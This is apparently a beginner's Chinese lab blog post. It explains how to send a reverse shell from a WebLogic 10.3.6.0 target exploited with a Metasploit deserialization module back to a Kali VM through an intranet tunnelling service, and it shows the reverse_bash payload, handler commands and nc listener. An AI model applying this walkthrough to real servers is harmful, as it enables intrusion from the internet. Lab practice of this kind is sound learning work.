小白一枚，记录一下 这个困扰了我很久的问题的解决方案。

平时做实验都是在虚拟机中完成，也就是内网，使用msf时，配置的payload 填写的 lhost 是内网的ip。那如果我要测试一台位于公网的机器，利用msf
攻击成功之后, 如何将shell 反弹到自己虚拟机上呢。这是我想讨论的问题。

## 一、环境搭建

  * 靶机 centOS7 （虚拟机）， ip：192.168.95.129
  * 攻击机 kali（虚拟机） ， ip: 192.168.95.195
  * 内网穿透工具 nsloop 网站：<https://du.nsloop.com/>
  * 宿主机 window 10 

1、靶机和 kali 在内网上，因为没 money 去买服务器，使用内网机器模拟一下，整体思路就是通过公网将shell反弹到内网机器上。

靶机上部署了 weblogic， 版本：10.3.6.0， 安装过程 可以参考其他 大佬博客。选择这个版本主要是为了能够利用
weblogic的反序列化漏洞。

2、内网穿透工具，按照官网的 文档 操作即可。我的端口转发配置是：内网 1111 端口， 这个端口是宿主机上的，当你配置好了 效果如下：

![](https://image.3001.net/images/20201201/1606791860_5fc5b2b4884193c1c3277.png!small)3、宿主机和虚拟机（网络模式为
NAT）也需要配置 端口转发，使用VMware的 转发工具即可（你也可以将虚拟机的 网络模式设置为 桥接模式，但是需要在kali上装
内网穿透客户端），VMware的端口转发配置如下：

![](https://image.3001.net/images/20201201/1606792610_5fc5b5a21ad29ca84c1f5.png!small)

## 二、漏洞利用

  1. 开启webloic服务，监听的端口为 7001， 在宿主机上 打开网页试一下：

![](https://image.3001.net/images/20201201/1606792782_5fc5b64e50cc1a4e29165.png!small)2\.
使用 kali 的 multi/misc/weblogic_deserialize_asyncresponseservice 这个攻击模块，注意配置
lhost 应该是 上面你内网穿透工具 提供的 域名，端口为 内网穿透工具 提供的 端口。

![1606792927_5fc5b6dfe50aef8319bbd.png!small?1606792926716](https://image.3001.net/images/20201201/1606792927_5fc5b6dfe50aef8319bbd.png!small?1606792926716)

3\. 直接运行 run， 但是会 报错，因为这个 lhost 理应为 本地的ip，但是没关系，因为我们选择的 payload
为cmd/unix/reverse_bash ， lhost 这个配置就是接收 反弹shell 的主机IP。我们填写 域名的意思就是 将这个shell
流量发送至 这个域名下的 34375 端口，因这个域名我们做了 端口转发，那么流量会转发到我们宿主机的 1111 端口，而宿主机的 1111
又会将流量转发至 kali的 1112 端口，因此 我们只需 再开一个窗口 使用 nc (netcat)监听就行。注意： **这里启动顺序应该调整为， 先用
nc 监听， 再进行msf 的攻击** 。

nc监听：

![1606793427_5fc5b8d39137a05a55455.png!small?1606793426330](https://image.3001.net/images/20201201/1606793427_5fc5b8d39137a05a55455.png!small?1606793426330)

再启动 msf ：

![1606793464_5fc5b8f8d4f38a9aeae48.png!small?1606793463569](https://image.3001.net/images/20201201/1606793464_5fc5b8f8d4f38a9aeae48.png!small?1606793463569)启动之后，nc
就能接收到这个 shell了：

![1606793514_5fc5b92a35d762ec45d30.png!small?1606793513009](https://image.3001.net/images/20201201/1606793514_5fc5b92a35d762ec45d30.png!small?1606793513009)

4.除了使用 nc，也可以 使用 msf的 监听模块，再开一个窗口，启动msf ，使用监听模块，然后选择与攻击模块中一致的 payload。 这里设置
LHOST 为 kali的 本机ip 192.168.95.195，端口为 1112

    
    
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload cmd/unix/reverse_bash
    msf6 exploit(multi/handler) > set lhost 192.168.95.195
    msf6 exploit(multi/handler) >set lport 1112

最终配置如下：

![1606793939_5fc5bad3e31273cd2a882.png!small?1606793938692](https://image.3001.net/images/20201201/1606793939_5fc5bad3e31273cd2a882.png!small?1606793938692)

5\. 先 run 监听模块，再run 攻击模块

![1606793998_5fc5bb0edb10e0b4d909d.png!small?1606793997635](https://image.3001.net/images/20201201/1606793998_5fc5bb0edb10e0b4d909d.png!small?1606793997635)

![1606794020_5fc5bb2432c818c2db876.png!small?1606794018875](https://image.3001.net/images/20201201/1606794020_5fc5bb2432c818c2db876.png!small?1606794018875)

6.最后也可接收到 shell

![1606794059_5fc5bb4be327819a8d72f.png!small?1606794058711](https://image.3001.net/images/20201201/1606794059_5fc5bb4be327819a8d72f.png!small?1606794058711)

## 三、总结

本次实验只是 对工具使用讨论，并不对漏洞进行分析，主要是能力还欠缺。所以最后使用 nc 或者 msf的 监听模块都可以对公网shell接收。

其实过程有点复杂，如果大佬们还有更加简便的方法，我愿洗耳恭听，欢迎一起讨论。

第一次写博客，如果文章中有不对的地方，还望指正，谢谢。

  

